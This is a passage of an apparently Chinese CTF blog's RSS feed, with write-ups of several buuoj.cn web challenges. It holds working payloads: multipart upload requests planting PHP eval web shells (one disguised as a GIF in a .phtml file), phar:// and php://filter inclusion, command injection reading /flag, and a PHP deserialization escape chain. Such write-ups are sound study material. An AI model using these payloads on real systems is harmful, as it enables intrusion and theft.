plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">home.php?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;e9791ad48bd0c6877a17604b0ad113bb&#x2F;GXYfddf1387c1384a5dd61134d16247860b.txt</span><br></pre></td></tr></table></figure><p>即可得到flag</p><p><strong>非预期</strong></p><p>看见P3师傅直接上传拿shell。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/home.php?file=upload&amp;name=shell.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Length</span>: 354</span><br><span class="line"><span class="attribute">Origin</span>: http://67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn/home.php?file=upload&amp;name=phar:///var/www/html/uploads/e9791ad48bd0c6877a17604b0ad113bb/GXYfddf1387c1384a5dd61134d16247860b.txt</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=7b53797fc49085aab012e24a85e31c46</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="test.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: text/php</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line">-----------------------------1489141389572370543625846861</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------1489141389572370543625846861-</span><br></pre></td></tr></table></figure><p>蚁剑连接即可。</p><p><a href="https://www.gem-love.com/ctf/490.html" target="_blank" rel="noopener">颖奇师傅博客</a>还有一个非预期,直接随意上传文件把name参数改成flag.php。即可拿到flag</p><h2 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h2><p>直接写一个脚本自动提交即可<a href="https://www.cnblogs.com/h3zh1/p/12702655.html" target="_blank" rel="noopener">来自h3zh1师傅的脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> url = <span class="string">"http://b4d1633d-5d1c-4b71-bedc-3545bea05581.node3.buuoj.cn/index.php"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">rr = re.compile(<span class="string">r"[0-9]+ [+|-] [0-9]+"</span>)</span><br><span class="line"></span><br><span class="line">r = s.get(url)</span><br><span class="line">r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">data = &#123;<span class="string">"answer"</span>:eval(rr.findall(r.text)[<span class="number">0</span>])&#125;</span><br><span class="line">r = s.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    answer = eval(rr.findall(r.text)[<span class="number">0</span>])</span><br><span class="line">    data = &#123; <span class="string">"answer"</span> : answer &#125;</span><br><span class="line">    r = s.post( url , data=data)</span><br><span class="line">    r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">    print(<span class="string">'[+%d]:'</span>%(i) + str(answer))</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;禁止套娃&quot;&gt;&lt;a href=&quot;#禁止套娃&quot; class=&quot;headerlink&quot; title=&quot;禁止套娃&quot;&gt;&lt;/a&gt;禁止套娃&lt;/h2&gt;&lt;p&gt;扫描目录发现git泄露&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://sunny250.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="刷题" scheme="https://sunny250.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
      <category term="gxyctf2019" scheme="https://sunny250.github.io/tags/gxyctf2019/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020刷题</title>
    <link href="https://sunny250.github.io/2020/04/26/ACTF%E5%88%B7%E9%A2%982020/"/>
    <id>https://sunny250.github.io/2020/04/26/ACTF%E5%88%B7%E9%A2%982020/</id>
    <published>2020-04-26T04:42:45.000Z</published>
    <updated>2020-04-26T04:42:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h2><p>简单为协议包含</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  然后base64解密</span><br><span class="line"></span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;9dc5b2d8-37cf-45a6-b5a3-68b3d5c6c2e5&#125;</span><br></pre></td></tr></table></figure><h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><p>没有进行过滤处理，考的是linux的知识点。一行linux语句如何执行多条linux语句。使用<code>&amp;&amp;</code>连接，或者分号<code>;</code>隔开。也可以使用管道符号<code>｜</code></p><p>但是在此处只能使用｜和分号。（不太清楚）</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat &#x2F;flag</span><br><span class="line">或者</span><br><span class="line">127.0.0.1;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h2><p>扫描目录发现备份文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sunny250@kali ~ <span class="comment"># dirb http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/ ~/web/dictionaries/CTFwebdir.txt </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Apr 26 13:01:43 2020</span><br><span class="line">URL_BASE: http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/</span><br><span class="line">WORDLIST_FILES: /Users/sx/web/dictionaries/CTFwebdir.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 53                                                            </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/ ----</span><br><span class="line">+ http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/index.php.bak (CODE:200|SIZE:347)</span><br><span class="line">+ http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/flag.php (CODE:200|SIZE:0)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Apr 26 13:01:46 2020</span><br><span class="line">DOWNLOADED: 53 - FOUND: 2</span><br></pre></td></tr></table></figure><p>访问index.php.bak得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若类型比较会先转换，字符串于整型对比，都会转换成整型。</p><blockquote><p><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">参考文章</a></p><p><a href="https://www.php.net/manual/en/function.intval.php" target="_blank" rel="noopener">intval函数</a></p></blockquote><p>输入key=123即可</p><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>打开题目是一个灯，鼠标移动到灯泡之后可以看见一个上传界面</p><p>直接上传1.php发现被禁止，尝试掐后缀，发现phtml可以</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------380150826415384369013004740571</span><br><span class="line"><span class="attribute">Content-Length</span>: 406</span><br><span class="line"><span class="attribute">Origin</span>: http://32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------380150826415384369013004740571</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="upload_file"; filename="1.phtml"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/gif</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;script language="php"&gt; </span><br><span class="line"><span class="attribute">eval($_POST[cmd]);</span></span><br><span class="line"><span class="attribute">&lt;/script&gt;</span></span><br><span class="line"><span class="attribute">-----------------------------380150826415384369013004740571</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line"><span class="attribute">upload</span></span><br><span class="line"><span class="attribute">-----------------------------380150826415384369013004740571--</span></span><br></pre></td></tr></table></figure><p>然后得到上传地址，使用蚁剑连接，拿flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Include&quot;&gt;&lt;a href=&quot;#Include&quot; class=&quot;headerlink&quot; title=&quot;Include&quot;&gt;&lt;/a&gt;Include&lt;/h2&gt;&lt;p&gt;简单为协议包含&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
      <category term="wp" scheme="https://sunny250.github.io/tags/wp/"/>
    
      <category term="web" scheme="https://sunny250.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>安恒月赛20200425</title>
    <link href="https://sunny250.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B20200425/"/>
    <id>https://sunny250.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B20200425/</id>
    <published>2020-04-25T05:36:03.000Z</published>
    <updated>2020-04-25T05:36:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezunserialize"><a href="#Ezunserialize" class="headerlink" title="Ezunserialize"></a>Ezunserialize</h2><p>打开就有源码</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure><p>看见替换想到字符串逃逸</p><p>因为A类中的username，password可控。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username =<span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b=<span class="keyword">new</span> C;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c=<span class="string">"flag.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($a); <span class="comment">//O:1:"A":2:&#123;s:8:"username";s:2:"\0";s:8:"password";O:1:"B":1:&#123;s:1:"b";O:1:"C":1:&#123;s:1:"c";s:8:"flag.php";&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>在经过替换函数后，字符减少了3个。正常的序列化后的字符串是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;tese&quot;;&#125;</span><br></pre></td></tr></table></figure><p>要使得password的类型变成对象类，就要把原本的字符串类型吃掉。</p><p>从而变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot;********&quot;;s:8:&quot;password&quot;;s:74:&quot;0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 (8个\0\0\0). b&#x3D;0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>本地测试通过了，但是远程没打通</p><h2 id="babytricks"><a href="#babytricks" class="headerlink" title="babytricks"></a>babytricks</h2><p>打开题目是一个登录框，查看源码发现提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips:select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Ezunserialize&quot;&gt;&lt;a href=&quot;#Ezunserialize&quot; class=&quot;headerlink&quot; title=&quot;Ezunserialize&quot;&gt;&lt;/a&gt;Ezunserialize&lt;/h2&gt;&lt;p&gt;打开就有源码&lt;/p&gt;
    
    </summary>
    
    
      <category term="比赛记录" scheme="https://sunny250.github.io/categories/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="待补充" scheme="https://sunny250.github.io/tags/%E5%BE%85%E8%A1%A5%E5%85%85/"/>
    
      <category term="刷题" scheme="https://sunny250.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF</title>
    <link href="https://sunny250.github.io/2020/04/19/NPUCTF/"/>
    <id>https://sunny250.github.io/2020/04/19/NPUCTF/</id>
    <published>2020-04-19T12:52:53.000Z</published>
    <updated>2020-04-19T12:52:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h2><p>给了源码</p><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span 